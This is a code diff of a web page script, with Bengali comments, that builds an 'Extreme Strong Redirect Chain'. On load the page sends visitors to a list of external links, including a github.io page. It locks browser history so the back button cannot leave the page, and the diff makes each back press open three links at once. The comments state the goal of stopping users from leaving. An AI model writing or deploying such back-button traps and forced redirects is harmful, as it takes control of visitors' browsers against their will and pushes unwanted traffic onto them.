@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Ultra Strong Redirect Chain</title>
+  <title>Extreme Strong Redirect Chain</title>
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
   <meta http-equiv="Pragma" content="no-cache" />
   <meta http-equiv="Expires" content="0" />
@@ -22,7 +22,7 @@
     "https://shimulqww.github.io/Unitedstatesvideos/"
   ];
 
-  const KEY = "redirect_chain_index_v5";
+  const KEY = "redirect_chain_index_v9";
 
   function getIndex() {
     const n = parseInt(sessionStorage.getItem(KEY), 10);
@@ -42,26 +42,28 @@
     }
   }
 
-  function nextRedirect() {
-    const i = getIndex();
-    if (i < LINKS.length) {
-      setIndex(i + 1);
+  // একসাথে একাধিক লিংক ওপেন করানোর ফাংশন
+  function multiRedirect(count = 3) {
+    let i = getIndex();
+    for (let j = 0; j < count && i < LINKS.length; j++, i++) {
       openStrong(LINKS[i]);
     }
+    setIndex(i);
   }
 
-  // প্রথমবার ঢুকলেই chain শুরু
-  nextRedirect();
+  // প্রথমবার ঢুকলেই শুরু হবে
+  multiRedirect(1);
 
-  // History Lock: back করলে বারবার redirect হবে, browser থেকে বের হতে দেবে না
+  // History Lock: back করলে browser থেকে বের হবে না
   function lockHistory() {
     history.pushState(null, null, location.href);
   }
   lockHistory();
 
+  // Back চাপলেই একসাথে 2-3 লিংক ওপেন
   window.addEventListener("popstate", function () {
     lockHistory();
-    nextRedirect();
+    multiRedirect(3); // প্রতি back এ 3টা লিংক ওপেন হবে
   });
 
 })();
